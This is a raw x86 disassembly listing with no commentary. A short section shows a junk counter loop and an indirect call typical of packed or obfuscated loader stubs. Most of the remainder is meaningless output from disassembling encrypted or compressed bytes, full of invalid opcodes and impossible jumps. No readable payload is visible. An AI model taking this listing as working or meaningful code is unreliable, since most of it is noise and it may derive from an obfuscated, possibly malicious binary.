  4028ea:	add    bl,BYTE PTR [edi]
  4028ec:	movq   mm2,QWORD PTR [ebx+0x39]
  4028f0:	or     bh,ah
  4028f2:	js     0x40292c
  4028f4:	imul   edi,DWORD PTR ds:0xd2bf2638,0xffffffca
  4028fb:	add    ebp,ebp
  4028fd:	aas    
  4028fe:	ret    
  4028ff:	or     al,0x87
  402901:	jbe    0x4028af
  402903:	pop    ss
  402904:	int    0x35
  402906:	adc    bh,BYTE PTR [ecx+0x71]
  402909:	xor    dl,BYTE PTR [esi]
  40290b:	in     eax,dx
  40290c:	shl    ah,1
  40290e:	pop    eax
  40290f:	fstp   TBYTE PTR [ecx+0x488a50d5]
  402915:	mov    ecx,0x94df3704
  40291a:	xor    BYTE PTR [esi+0x74],dl
  40291d:	jp     0x402967
  40291f:	xchg   edx,eax
  402920:	push   ebp
  402921:	fiadd  WORD PTR [eax*1+0x3fda5806]
  402928:	push   esp
  402929:	in     al,dx
  40292a:	xor    BYTE PTR ds:0xfa446bf0,bh
  402930:	xchg   ebp,eax
  402931:	idiv   BYTE PTR [eax-0x736a4db4]
  402937:	xchg   esi,eax
  402938:	cmp    DWORD PTR [esi-0x754dafee],esi
  40293e:	leave  
  40293f:	pushf  
  402940:	bnd jmp 0xdc18b36d
  402946:	outs   dx,DWORD PTR ds:[esi]
  402947:	cmp    edi,edx
  402949:	mov    DWORD PTR ds:0x434292,0x545f
  402953:	je     0x40391f
  402959:	and    edx,edx
  40295b:	mov    edx,DWORD PTR [ebp-0x8]
  40295e:	sbb    DWORD PTR ds:0x432cde,0x186f
  402968:	mov    eax,DWORD PTR [ebp-0x4]
  40296b:	xor    eax,ecx
  40296d:	and    DWORD PTR ds:0x43429e,0x0
  402977:	jmp    0x402989
  40297c:	mov    edi,DWORD PTR ds:0x43429e
  402982:	inc    edi
  402983:	mov    DWORD PTR ds:0x43429e,edi
  402989:	cmp    DWORD PTR ds:0x43429e,0x10
  402990:	jae    0x4029c8
  402996:	cmp    DWORD PTR ds:0x43429e,0x14
  40299d:	jne    0x4029c3
  4029a3:	push   DWORD PTR [ebp-0x18]
  4029a6:	push   0x43427e
  4029ab:	push   0x4692
  4029b0:	push   0x432638
  4029b5:	push   DWORD PTR [ebp-0x14]
  4029b8:	push   0x4d96
  4029bd:	call   DWORD PTR ds:0x432bea
  4029c3:	jmp    0x40297c
  4029c8:	mov    edi,0xffcd8d64
  4029cd:	sub    edi,eax
  4029cf:	add    edi,DWORD PTR [ebp+0x10]
  4029d2:	xor    edx,ecx
  4029d4:	adc    DWORD PTR ds:0x432ce6,0x432cbe
  4029de:	add    edx,esi
  4029e0:	mov    DWORD PTR ds:0x43426a,0x3472
  4029ea:	cmp    edx,edi
  4029ec:	ja     0x40391a
  4029f2:	push   ebx
  4029f3:	jmp    0x4029fd
  4029f8:	mov    esi,0x32729c
  4029fd:	mov    eax,DWORD PTR [ebp-0x8]
  402a00:	jmp    0x402db6
  402a05:	mov    eax,ds:0x61e6e778
  402a0a:	in     eax,0xa1
  402a0c:	inc    ebx
  402a0d:	sub    BYTE PTR [edi+0x69b711fc],ah
  402a13:	xor    ebx,DWORD PTR [esi+0x0]
  402a16:	or     al,0x70
  402a18:	jo     0x4029b1
  402a1a:	jge    0x402a8c
  402a1c:	jo     0x402a52
  402a1e:	das    
  402a1f:	xchg   ecx,eax
  402a20:	cmp    esi,DWORD PTR [edx]
  402a22:	imul   eax,eax,0x301e6884
  402a28:	repnz dec edx
  402a2a:	jge    0x4029ee
  402a2c:	call   0x86a78e44
  402a31:	stc    
  402a32:	jmp    0x4029bc
  402a34:	ins    DWORD PTR es:[edi],dx
  402a35:	mov    WORD PTR [eax-0x5742fb9c],gs
  402a3b:	push   ebx
  402a3c:	jo     0x4029f3
  402a3e:	icebp  
  402a3f:	std    
  402a40:	or     al,BYTE PTR [esi+0x1e]
  402a43:	pop    ebx
  402a44:	outs   dx,BYTE PTR ds:[esi]
  402a45:	mov    ch,0x66
  402a47:	mov    ds:0x59a65419,al
  402a4c:	mov    ds:0x22b8eca,al
  402a51:	into   
  402a52:	mov    bl,0xd5
  402a54:	in     eax,dx
  402a55:	mov    bh,0x73
  402a57:	pop    ebx
  402a58:	pop    ecx
  402a59:	fdiv   st(6),st
  402a5b:	popa   
  402a5c:	sbb    DWORD PTR [ebp-0x3a2cbe1c],ecx
  402a62:	ss call 0xe35e13a5
  402a68:	leave  
  402a69:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402a6a:	jmp    0x20d4f921
  402a6f:	push   ebp
  402a70:	jecxz  0x402a90
  402a72:	loope  0x402adf
  402a74:	cs ins DWORD PTR es:[edi],dx
  402a76:	add    DWORD PTR [esi-0x58],ecx
  402a79:	xor    BYTE PTR [edi+0x1e],0xe3
  402a7d:	inc    ebp
  402a7e:	(bad)  [edx+0x5e8d866c]
  402a84:	dec    ebp
  402a85:	adc    eax,0x73c85d3
  402a8a:	pop    es
  402a8b:	push   esi
  402a8c:	(bad)  
  402a8e:	int3   
  402a8f:	test   BYTE PTR [eax-0x238cba5c],ch
  402a95:	test   DWORD PTR [edi+0x5f108595],ebx
  402a9b:	mov    dh,0xb5
  402a9d:	jmp    0x402a5e
  402a9f:	sub    DWORD PTR [edx-0x34e28ba9],0xffffffa8
  402aa6:	out    0x97,eax
  402aa8:	jmp    0x44fd:0x1036c83e
  402aaf:	sbb    DWORD PTR [ecx-0x35137f49],esi
  402ab5:	aaa    
  402ab6:	mov    esi,0x66eec78b
  402abb:	cmp    eax,DWORD PTR [edx]
  402abd:	cmp    eax,0x4f1470f
  402ac2:	test   ch,ah
  402ac4:	aad    0xc6
  402ac6:	fucomp st(3)
  402ac8:	int    0x9a
  402aca:	cwde   
  402acb:	and    ebp,DWORD PTR [edx]
  402acd:	nop
  402ace:	lods   al,BYTE PTR ds:[esi]
  402acf:	mov    edx,0xac6175b6
  402ad4:	fwait
  402ad5:	hlt    
  402ad6:	loope  0x402b3c
  402ad8:	frstor [ebx+eax*1+0x69]
  402adc:	fist   WORD PTR [esi+edx*2+0x2c]
  402ae0:	dec    di
  402ae2:	adc    al,0xbf
  402ae4:	cmc    
  402ae5:	inc    ecx
  402ae6:	mov    ebx,ss
  402ae8:	or     dh,BYTE PTR [esi-0x73712991]
  402aee:	(bad)  
  402aef:	push   0x95587e50
  402af4:	outs   dx,BYTE PTR ds:[esi]
  402af5:	or     al,0x6
  402af7:	mov    cl,0xfb
  402af9:	pop    eax
  402afa:	call   0xf939f29e
  402aff:	pop    eax
  402b00:	mov    ch,bh
  402b02:	call   FWORD PTR [edx+ecx*4]
  402b05:	mov    edx,0x7b98ba5
  402b0a:	ret    
  402b0b:	leave  
  402b0c:	sub    eax,0xd8b25372
  402b11:	cmp    esi,ecx
  402b13:	jecxz  0x402b08
  402b15:	leave  
  402b16:	popa   
  402b17:	fisttp DWORD PTR [eax]
  402b19:	add    al,0xac
  402b1b:	add    BYTE PTR [esi-0x48f7b9c],0x36
  402b22:	jns    0x402af9
  402b24:	mov    al,0x53
  402b26:	mov    cl,0xb4
  402b28:	ins    DWORD PTR es:[edi],dx
  402b29:	repz lea edx,es:[edx+0x267b3483]
  402b31:	push   edx
  402b32:	test   BYTE PTR [esp+ecx*4-0x1ed7ffa0],al
  402b39:	outs   dx,BYTE PTR ds:[esi]
  402b3a:	dec    edx
  402b3b:	mov    ebx,0x50ad6864
  402b40:	sub    esi,ebp
  402b42:	adc    DWORD PTR [edi],ebx
  402b44:	in     al,dx
  402b45:	cmp    al,BYTE PTR [esi]
  402b47:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402b48:	js     0x402b82
  402b4a:	jmp    0x53dc18d7
  402b4f:	adc    ch,BYTE PTR [ebx]
  402b51:	stos   DWORD PTR es:[edi],eax
  402b52:	mov    dl,0x4f
  402b54:	icebp  
  402b55:	jne    0x402b38
  402b57:	mov    ch,0x92
  402b59:	test   BYTE PTR [esi],bl
  402b5b:	fistp  WORD PTR [ebp+eax*4-0x44bac094]
  402b62:	cmp    edx,DWORD PTR [eax+0x3a87c555]
  402b68:	pop    esi
  402b69:	add    eax,0x7b4a8bc8
  402b6e:	scas   al,BYTE PTR es:[edi]
  402b6f:	dec    eax
  402b70:	popf   
  402b71:	lods   al,BYTE PTR ds:[esi]
  402b72:	test   DWORD PTR [edi-0x68],esi
  402b75:	adc    ebx,0xfffffffd
  402b78:	lds    edi,FWORD PTR [eax]
  402b7a:	and    ah,BYTE PTR [eax]
  402b7c:	fbld   TBYTE PTR [ebx+0x1e716fad]
  402b82:	dec    edx
  402b83:	xor    BYTE PTR [esi-0x5a],bh
  402b86:	shl    DWORD PTR [ebp+0x1e51ab10],0x25
  402b8d:	pop    esi
  402b8e:	push   0x3db876de
  402b93:	dec    ecx
  402b94:	mov    bl,0x3
  402b96:	push   ecx
  402b97:	or     BYTE PTR [esp+eax*2+0x4c],ah
  402b9b:	repnz sub dl,bh
  402b9e:	call   0xcc2b6ec9
  402ba3:	jns    0x402b27
  402ba5:	xor    BYTE PTR [edi-0x1e43b261],ch
  402bab:	sbb    dl,dh
  402bad:	imul   ebx,DWORD PTR [ecx+0x3d8f4fa4],0x305028f9
  402bb7:	jno    0x402bb1
  402bb9:	jae    0x402bcc
  402bbb:	sbb    ah,cl
  402bbd:	sbb    dl,bh
  402bbf:	xchg   edx,eax
  402bc0:	cld    
  402bc1:	call   0xd39091ef
  402bc6:	aad    0xbf
  402bc8:	cwde   
  402bc9:	loope  0x402c1f
  402bcb:	emms   
  402bcd:	popa   
  402bce:	xchg   ebx,eax
  402bcf:	lahf   
  402bd0:	lea    ebp,[edx-0x360ee2b2]
  402bd6:	pushf  
  402bd7:	jl     0x402b6c
  402bd9:	loop   0x402b85
  402bdb:	icebp  
  402bdc:	pop    ebx
  402bdd:	test   al,0x2b
  402bdf:	stos   BYTE PTR es:[edi],al
  402be0:	dec    edx
  402be1:	xchg   BYTE PTR [ecx-0x7ae2cb59],ah
  402be7:	fsubr  QWORD PTR [edi-0x45]
  402bea:	and    edi,DWORD PTR [ecx]
  402bec:	xchg   esi,eax
  402bed:	mov    edi,0x850b86e8
  402bf2:	pop    ebp
  402bf3:	xchg   edx,eax
  402bf4:	jg     0x402c56
  402bf6:	(bad)  
  402bf7:	lods   eax,DWORD PTR cs:[esi]
  402bf9:	out    0xb0,al
  402bfb:	push   cs
  402bfc:	mov    ebx,DWORD PTR gs:[esi+0x79fff9d0]
  402c03:	adc    BYTE PTR [esi+0xc],ah
  402c06:	xor    BYTE PTR [ebx-0x41d7fae2],ch
  402c0c:	xchg   edi,eax
  402c0d:	(bad)
  402c11:	daa    
  402c12:	loop   0x402c6d
  402c14:	lods   al,BYTE PTR ds:[esi]
  402c15:	dec    esi
  402c16:	les    esi,FWORD PTR [esi+0x49]
  402c19:	(bad)  
  402c1a:	fisttp WORD PTR [edi]
  402c1c:	mov    eax,0xe2567cc6
  402c21:	(bad)  
  402c22:	xchg   edi,eax
  402c23:	and    bl,BYTE PTR [ebx]
  402c25:	adc    eax,0x7ddcb00a
  402c2a:	jg     0x402be7
  402c2c:	aad    0x63
  402c2e:	sub    eax,0x413b3aae
  402c33:	pop    ds
  402c34:	bound  edi,QWORD PTR [edi]
  402c36:	les    edi,FWORD PTR [ebx+ebp*4]
  402c39:	rcr    DWORD PTR [esi+0x68cc2880],1
  402c3f:	and    al,0x69
  402c41:	or     eax,0x553b1f46
  402c46:	xchg   ecx,eax
  402c47:	into   
  402c48:	js     0x402bd6
  402c4a:	aas    
  402c4b:	cli    
  402c4c:	in     al,0x50
  402c4e:	(bad)  
  402c4f:	fldenv [eax]
  402c51:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402c52:	aad    0xe8
  402c54:	pop    es
  402c55:	push   esi
  402c56:	cmc    
  402c57:	sbb    edi,DWORD PTR [ecx-0x1e]
  402c5a:	add    ecx,eax
  402c5c:	or     bh,al
  402c5e:	div    dh
  402c60:	xchg   edi,eax
  402c61:	and    eax,0xa25f0f1c
  402c66:	mov    dl,0x36
  402c68:	fisttp WORD PTR [edx]
  402c6a:	push   ss
  402c6b:	test   DWORD PTR [ebx+0x7d],ebx
  402c6e:	mov    ah,0x55
  402c70:	jmp    0x51e:0x7ec2763a
  402c77:	jmp    0xe2041561
  402c7c:	stos   BYTE PTR es:[edi],al
  402c7d:	mov    al,0xae
  402c7f:	pop    edi
  402c80:	pop    es
  402c81:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402c82:	pop    edi
  402c83:	xor    BYTE PTR [ecx+0x185910a5],ch
  402c89:	jg     0x402c64
  402c8b:	leave  
  402c8c:	fneni(8087 only) 
  402c8e:	push   0xffffffea
  402c90:	mov    eax,DWORD PTR [edx]
  402c92:	mov    ah,0x11
  402c94:	fild   QWORD PTR [edx+0x7728a941]
  402c9a:	xchg   BYTE PTR [eax],al
  402c9c:	adc    ch,bl
  402c9e:	add    eax,0x1d981b5b
  402ca3:	sub    DWORD PTR [ebp+0x40],esi
  402ca6:	xchg   edi,eax
  402ca7:	pop    ds
  402ca8:	outs   dx,BYTE PTR ds:[esi]
  402ca9:	mov    ecx,0x43801ee3
  402cae:	jbe    0x402c82
  402cb0:	ds lahf 
  402cb2:	xchg   ebx,eax
  402cb3:	fs idiv bl
  402cb6:	mov    ds:0xce0a296,al
  402cbb:	xchg   edi,eax
  402cbc:	inc    esi
  402cbd:	(bad)  
  402cbe:	psubsb mm6,QWORD PTR [ecx*8+0x39651923]
  402cc6:	shl    dl,cl
  402cc8:	push   eax
  402cc9:	sar    DWORD PTR [esi-0x22],0xe0
  402ccd:	fs daa 
  402ccf:	shl    dl,cl
  402cd1:	pushf  
  402cd2:	das    
  402cd3:	or     bl,bl
  402cd5:	pop    esp
  402cd6:	dec    ebp
  402cd7:	vpperm ymm11,ymm4,YMMWORD PTR [ebx-0x65f73018],ymm4
  402ce1:	jns    0x402ca8
  402ce3:	ret    
  402ce4:	add    al,0xb0
  402ce6:	or     al,0xbd
  402ce8:	(bad)  
  402ce9:	retf   
  402cea:	inc    al
  402cec:	push   edx
  402ced:	sbb    al,0x6
  402cef:	dec    ecx
  402cf0:	push   ds
  402cf1:	adc    ebx,DWORD PTR [edx+0x41e1591c]
  402cf7:	repnz outs dx,DWORD PTR ds:[esi]
  402cf9:	xor    eax,0x942ba274
  402cfe:	lods   al,BYTE PTR ds:[esi]
  402cff:	int    0xea
  402d01:	loopne 0x402d65
  402d03:	sub    cl,BYTE PTR [eax+0x21]
  402d06:	fmulp  st(7),st
  402d08:	xor    esp,esp
  402d0a:	(bad)  
  402d0b:	jp     0x402cf0
  402d0d:	sub    al,0x57
  402d0f:	jo     0x402cc0
  402d11:	mov    BYTE PTR [ebx-0x45],0xf2
  402d15:	or     al,0x9f
  402d17:	xor    bl,BYTE PTR [edx+edx*1]
  402d1a:	(bad)  
  402d1b:	mov    bl,0xe5
  402d1d:	arpl   WORD PTR [edx-0x35bd2600],sp
  402d23:	out    0xb9,al
  402d25:	jnp    0x402d06
  402d27:	and    al,0x77
  402d29:	sub    dl,BYTE PTR [esi+0x1]
  402d2c:	jno    0x402d5d
  402d2e:	outs   dx,BYTE PTR ds:[esi]
  402d2f:	(bad)  
  402d30:	add    BYTE PTR [edi+0x75],al
  402d33:	jp     0x402d9a
  402d35:	and    ah,ch
  402d37:	adc    DWORD PTR [edi+0xfe43a3c],ebx
  402d3d:	jecxz  0x402ceb
  402d3f:	jnp    0x402dac
  402d41:	pushf  
  402d42:	mov    ds:0xf3c7876b,eax
  402d47:	push   eax
  402d48:	pop    es
  402d49:	(bad)  
  402d4a:	sbb    BYTE PTR [esi-0x25997b91],al
  402d50:	or     ecx,ebx
  402d52:	add    al,0x18
  402d54:	sahf   
  402d55:	mov    dl,0x5f
  402d57:	cmp    eax,0xf3edc0d1
  402d5c:	push   0xe64f1add
  402d61:	mov    al,ds:0xe6326138
  402d66:	sbb    BYTE PTR [ecx+esi*1],cl
  402d69:	popf   
  402d6a:	mov    al,ds:0xa6f1dd7e
  402d6f:	push   ecx
  402d70:	(bad)  
  402d71:	ja     0x402d18
  402d73:	push   eax
  402d74:	popf   
  402d75:	push   eax
  402d76:	adc    bh,BYTE PTR [edi+0x3b]
  402d79:	push   0xf8b795dd
  402d7e:	mov    edx,0xf683f320
  402d83:	(bad)  
  402d84:	scas   al,BYTE PTR es:[edi]
  402d85:	out    dx,al
  402d86:	shl    ch,1
  402d88:	and    al,0x7f
  402d8a:	fimul  WORD PTR [esi+0x6b1c4a03]
  402d90:	push   es
  402d91:	adc    al,0x18
  402d93:	lea    eax,[ebp+ebp*1-0x3a7bf01e]
  402d9a:	jnp    0x402dd2
  402d9c:	pushf  
  402d9d:	xchg   ebp,eax
  402d9e:	fnstenv [edx+0x6f]
  402da1:	xor    ecx,DWORD PTR [edi+edx*1]
  402da4:	add    DWORD PTR [edi+eiz*8],ebp
  402da7:	adc    DWORD PTR [eax-0x73],ecx
  402daa:	mov    ah,0xcb
  402dac:	test   DWORD PTR [edx],ecx
  402dae:	jp     0x402da9
  402db0:	xchg   esi,eax
  402db1:	push   ebx
  402db2:	repz dec ebx
  402db4:	loopne 0x402da6
  402db6:	mov    edi,DWORD PTR [ebp-0x4]
  402db9:	jmp    0x40316f
  402dbe:	cs out dx,eax
  402dc0:	loopne 0x402e3e
  402dc2:	in     eax,dx
  402dc3:	jnp    0x402daf
  402dc5:	jmp    0x3c56257c
  402dca:	jb     0x402dbb
  402dcc:	adc    edx,DWORD PTR [edi-0x59]
  402dcf:	or     DWORD PTR [eax+0x70],esi
  402dd2:	xchg   edi,eax
  402dd3:	jge    0x402e45
  402dd5:	jo     0x402dea
  402dd7:	not    DWORD PTR [esi]
  402dd9:	pop    esp
  402dda:	ja     0x402e1a
  402ddc:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  402dde:	ja     0x402d72
  402de0:	rcl    DWORD PTR [ebx],0xfe
  402de3:	mov    bh,0x62
  402de5:	(bad)  
  402de6:	mov    ds:0xc712f9c4,eax
  402deb:	fidivr DWORD PTR ds:0x338f5af3
  402df1:	add    ah,BYTE PTR [eax]
  402df3:	dec    edx
  402df4:	lea    ecx,[esi]
  402df6:	mov    ecx,0x5a3b2a66
  402dfb:	inc    edx
  402dfc:	pop    ebp
  402dfd:	es inc ebx
  402dff:	dec    esp
  402e00:	lea    eax,[edx]
  402e02:	rcl    bh,cl
  402e04:	and    BYTE PTR [edx],dl
  402e06:	jmp    0xe44d558b
  402e0b:	cwde   
  402e0c:	fs in  eax,0xc2
  402e0f:	lock xchg edx,eax
  402e11:	outs   dx,DWORD PTR ds:[esi]
  402e12:	pop    eax
  402e13:	add    al,BYTE PTR [ecx]
  402e15:	hlt    
  402e16:	inc    eax
  402e17:	add    al,0xa3
  402e19:	cld    
  402e1a:	cli    
  402e1b:	mov    bl,0xf7
  402e1d:	jns    0x402dfd
  402e1f:	pop    ds
  402e20:	ret    
  402e21:	dec    esp
  402e22:	sbb    bl,BYTE PTR [edx-0x1a]
  402e25:	sbb    cl,BYTE PTR [eax+eiz*1]
  402e28:	add    BYTE PTR [esp+edx*2-0x5b],0x7c
  402e2d:	jo     0x402e2a
  402e2f:	push   es
  402e30:	push   ebp
  402e31:	adc    al,0x5c
  402e33:	cwde   
  402e34:	rol    BYTE PTR [edx+0x41],cl
  402e37:	xor    ecx,DWORD PTR [edx-0x7f]
  402e3a:	dec    edx
  402e3b:	or     eax,0xc16b9535
  402e40:	lods   al,BYTE PTR ds:[esi]
  402e41:	mov    edi,0xcde4336a
  402e46:	repz dec eax
  402e48:	outs   dx,BYTE PTR ds:[esi]
  402e49:	or     eax,0x6294d8b1
  402e4e:	rcl    dh,cl
  402e50:	push   ss
  402e51:	sub    BYTE PTR [ebp+0x4f],bl
  402e54:	dec    eax
  402e55:	adc    eax,0x1a19d56
  402e5a:	xor    al,0xe9
  402e5c:	adc    BYTE PTR [edx],bh
  402e5e:	xchg   BYTE PTR [ecx],bh
  402e60:	xchg   al,ch
  402e62:	cmp    eax,0x691e9c92
  402e67:	dec    ebp
  402e68:	jne    0x402ec4
  402e6a:	inc    ecx
  402e6b:	inc    ebp
  402e6c:	outs   dx,BYTE PTR ds:[esi]
  402e6d:	test   DWORD PTR [ebp+0x16],ecx
  402e70:	mov    eax,0x1b213ba1
  402e75:	sub    edx,DWORD PTR [eax-0x217c7a7a]
  402e7b:	call   0xeca5f807
  402e80:	retf   0x2feb
  402e83:	aam    0xdc
  402e85:	imul   ebx,esp,0xffffffcc
  402e88:	cmp    BYTE PTR [eax-0x1df065ad],0x11
  402e8f:	ins    BYTE PTR es:[edi],dx
  402e90:	mov    BYTE PTR [edi-0x50],dl
  402e93:	push   ebx
  402e94:	push   ebx
  402e95:	lds    esi,FWORD PTR ds:0x26e81313
  402e9b:	aad    0x14
  402e9d:	gs sub esi,ebx
  402ea0:	das    
  402ea1:	mov    ss,WORD PTR [eax+ebp*4-0x7669ac55]
  402ea8:	pop    ecx
  402eaa:	adc    ecx,eax
  402eac:	jl     0x402e8f
  402eae:	mov    ebp,DWORD PTR [eax+0x1174e19]
  402eb4:	and    eax,0xb0358ecf
  402eb9:	jge    0x402f2b
  402ebb:	pop    esi
  402ebd:	daa    
  402ebe:	stos   BYTE PTR es:[edi],al
  402ebf:	mov    WORD PTR [eax],?
  402ec1:	test   BYTE PTR [esi-0x7f],dl
  402ec4:	inc    esp
  402ec5:	add    eax,0x9f46522a
  402eca:	call   0x6c078d8b
  402ecf:	outs   dx,BYTE PTR ds:[esi]
  402ed0:	pop    esi
  402ed1:	shl    DWORD PTR [eax+0x70],0xb2
  402ed5:	mov    ebp,0x27719187
  402eda:	int3   
  402edb:	adc    DWORD PTR [eax],esp
  402edd:	(bad)  
  402ede:	test   eax,0x7147107e
  402ee3:	stos   BYTE PTR es:[edi],al
  402ee4:	imul   edx,DWORD PTR [ecx+edx*8-0x7d4943e9],0x2e
  402eec:	mov    edx,0xe77380d6
  402ef1:	push   0xffffff83
  402ef3:	xor    DWORD PTR [esi],esp
  402ef5:	fsub   st(2),st
  402ef7:	test   eax,edx
  402ef9:	fst    QWORD PTR [ebp+edi*1-0x7aaf1322]
  402f00:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402f01:	lea    ebp,[ebx-0x52fbf128]
  402f07:	shl    BYTE PTR [ebx],1
  402f09:	inc    ebp
  402f0a:	xor    BYTE PTR [esi-0x2c],dh
  402f0d:	jecxz  0x402f7f
  402f0f:	cli    
  402f10:	pop    es
  402f11:	add    BYTE PTR [edx-0x9bdf8dd],dl
  402f17:	test   al,0x1b
  402f19:	test   BYTE PTR ds:0x8a67ef47,ah
  402f1f:	mov    edx,0x92881db9
  402f24:	lea    ecx,[ecx+edx*1]
  402f27:	int    0x1a
  402f29:	stc    
  402f2a:	jl     0x402f33
  402f2c:	shr    dl,1
  402f2e:	lahf   
  402f2f:	adc    ebp,DWORD PTR [edx+0x5960729f]
  402f35:	and    eax,0x5073d817
  402f3a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402f3b:	call   0x1d728716
  402f40:	aad    0x72
  402f42:	hlt    
  402f43:	pop    ecx
  402f44:	pusha  
  402f45:	fnsave ds:0x486c22e6
  402f4b:	aam    0x48
  402f4d:	mov    dh,0x60
  402f4f:	mov    WORD PTR [edi+0x7a],?
  402f52:	dec    esp
  402f53:	rol    BYTE PTR [edi-0x68f6b5b4],cl
  402f59:	mov    dl,0x1c
  402f5b:	jp     0x402f13
  402f5d:	cmp    bl,BYTE PTR [edx-0x69]
  402f60:	and    eax,0xe2b714b
  402f65:	dec    ebp
  402f66:	mov    edi,0x2c033d38
  402f6b:	std    
  402f6c:	outs   dx,BYTE PTR ds:[esi]
  402f6d:	pop    ebx
  402f6e:	arpl   WORD PTR [ecx+0x427aa125],sp
  402f74:	push   0xfc0fbe0a
  402f79:	mov    al,0x15
  402f7b:	sub    al,0xe7
  402f7d:	xor    bl,BYTE PTR [edx-0x6386e50f]
  402f83:	dec    esp
  402f84:	pop    ebp
  402f85:	and    esp,0x19e938d3
  402f8b:	bts    esp,ebp
  402f8e:	push   0xfffffff3
  402f90:	jmp    0x402f71
  402f92:	pushf  
  402f93:	adc    BYTE PTR [esi+0x75dfe1c6],0xb8
  402f9a:	xlat   BYTE PTR ds:[ebx]
  402f9b:	or     al,0xa4
  402f9d:	sub    BYTE PTR [edx+0x5626a6e5],dl
  402fa3:	dec    edi
  402fa4:	inc    edi
  402fa5:	sbb    eax,0xd39653da
  402faa:	pop    edx
  402fab:	into   
  402fac:	fcmovnb st,st(7)
  402fae:	lock xor BYTE PTR [eax-0x53295f22],dl
  402fb5:	xor    DWORD PTR [eax-0x7d],edi
  402fb8:	xlat   BYTE PTR ds:[ebx]
  402fb9:	xchg   edi,eax
  402fba:	shr    ebp,1
  402fbc:	bnd jle 0x402fa3
  402fbf:	call   0xcdcb5750
  402fc4:	cmp    BYTE PTR [esi],dh
  402fc6:	cmp    BYTE PTR [ecx],bh
  402fc8:	xor    DWORD PTR [edi-0x16],esp
  402fcb:	mov    bh,0x8
  402fcd:	retf   0xe9dd
  402fd0:	adc    ecx,esp
  402fd2:	(bad)  
  402fd4:	mov    cl,0xd1
  402fd6:	loopne 0x403042
  402fd8:	cmp    al,0xbf
  402fda:	xchg   ebx,eax
  402fdb:	lds    ecx,FWORD PTR [esi+0x7f]
  402fde:	and    al,0x11
  402fe0:	adc    eax,DWORD PTR [ebx-0x4103c523]
  402fe6:	cs pop edx
  402fe8:	ins    BYTE PTR es:[edi],dx
  402fe9:	(bad)  
  402fea:	in     al,0x3e
  402fec:	inc    eax
  402fed:	fwait
  402fee:	pop    es
  402fef:	jmp    0x3fce:0x8063b236
  402ff6:	xor    bh,BYTE PTR [ebx]
  402ff8:	add    BYTE PTR [ebp-0x3610185],ah
  402ffe:	ret    0x2336
  403001:	sub    dl,BYTE PTR [eax]
  403003:	je     0x40303a
  403005:	stos   DWORD PTR es:[edi],eax
  403006:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403007:	xor    bh,BYTE PTR [eax+0x4d502605]
  40300d:	xchg   ebx,eax
  40300e:	add    BYTE PTR [esi-0x4f],ah
  403011:	ins    BYTE PTR es:[edi],dx
  403012:	add    eax,0x795c4f16
  403017:	inc    eax
  403018:	aaa    
  403019:	imul   esi
  40301b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40301c:	test   DWORD PTR [ebx+0x10],esp
  40301f:	mov    WORD PTR [ebp+0x43020c01],cs
  403025:	lods   al,BYTE PTR ds:[esi]
  403026:	repz and al,0x4e
  403029:	jb     0x40307c
  40302b:	jmp    0x377e:0xf2d95c62
  403032:	rcr    DWORD PTR [eax-0x6a61bb01],0x82
  403039:	sub    ecx,ebp
  40303b:	cli    
  40303c:	test   DWORD PTR [ebx],0xae7d0c3b
  403042:	pop    ebx
  403043:	or     eax,0xbb18e182
  403048:	add    edi,DWORD PTR [edx+edx*8]
  40304b:	push   cs
  40304c:	(bad)  ds:0x47cc0771
  403052:	pop    eax
  403053:	jmp    0x403062
  403055:	pop    edx
  403056:	pushf  
  403057:	cmp    ch,BYTE PTR ds:0x35f79e95
  40305d:	ficomp DWORD PTR [edi+0x2349aace]
  403063:	cmp    eax,0x53276e7c
  403068:	xchg   BYTE PTR [ebp+0x47],ch
  40306b:	dec    esi
  40306c:	mov    eax,esi
  40306e:	mov    edx,0xf676fbea
  403073:	cwde   
  403074:	jle    0x403072
  403076:	xor    BYTE PTR [edi],ah
  403078:	sbb    ebp,0xdb69a39f
  40307e:	xlat   BYTE PTR ds:[ebx]
  40307f:	inc    esi
  403080:	rol    BYTE PTR [ebx],cl
  403082:	mov    bl,0x72
  403084:	inc    edx
  403085:	sbb    DWORD PTR [esi+0x625b7dc2],edi
  40308b:	sbb    BYTE PTR [ebp+0xa],ah
  40308e:	xchg   edx,eax
  40308f:	adc    al,0xa9
  403091:	lock test al,0x44
  403094:	add    eax,0xed133a40
  403099:	jne    0x4030e5
  40309b:	adc    DWORD PTR [ebp-0x532026db],0xffffff97
  4030a2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4030a3:	popf   
  4030a4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4030a5:	mov    esp,0x389d279d
  4030aa:	in     al,0x32
  4030ac:	(bad)  
  4030ad:	in     al,0x56
  4030af:	mov    WORD PTR [ecx+0x17],cs
  4030b2:	push   ebp
  4030b3:	arpl   si,dx
  4030b5:	cmp    al,0x4a
  4030b7:	mov    BYTE PTR [ebx-0x14],cl
  4030ba:	jns    0x403050
  4030bc:	in     eax,0x80
  4030be:	pop    esp
  4030bf:	sahf   
  4030c0:	aam    0x13
  4030c2:	ret    
  4030c3:	jb     0x4030dd
  4030c5:	jo     0x4030e3
  4030c7:	and    BYTE PTR [esi-0x7b67b847],al
  4030cd:	push   esi
  4030ce:	(bad)  
  4030cf:	cli    
  4030d0:	stos   BYTE PTR es:[edi],al
  4030d1:	sub    BYTE PTR [ebp+0x482b9cb1],cl
  4030d7:	ret    0x2d4f
  4030da:	mov    ds:0x39990f0c,eax
  4030df:	cli    
  4030e0:	ret    0x2587
  4030e3:	pop    ds
  4030e4:	(bad)  
  4030e5:	repnz dec ecx
  4030e7:	push   ebx
  4030e8:	scas   eax,DWORD PTR es:[edi]
  4030e9:	cmp    esi,DWORD PTR [edx]
  4030eb:	inc    ecx
  4030ec:	add    BYTE PTR [ebx+0x2dab7a9c],dh
  4030f2:	into   
  4030f3:	xchg   BYTE PTR [esi+0x7d163131],al
  4030f9:	cmp    cl,BYTE PTR [eax-0x605a79e3]
  4030ff:	ret    0xff3c
